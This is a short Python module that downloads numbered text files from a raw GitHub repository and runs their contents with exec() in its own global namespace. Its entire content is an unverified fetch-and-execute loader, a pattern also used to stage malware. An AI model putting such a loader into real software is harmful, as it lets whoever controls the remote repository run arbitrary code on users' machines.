import requests

BASE_URL = "https://raw.githubusercontent.com/pymailsy/ml/main"

def get_code(n):
    url = f"{BASE_URL}/{n}.txt"
    r = requests.get(url)
    r.raise_for_status()
    return r.text

def run(n):
    exec(get_code(n), globals())
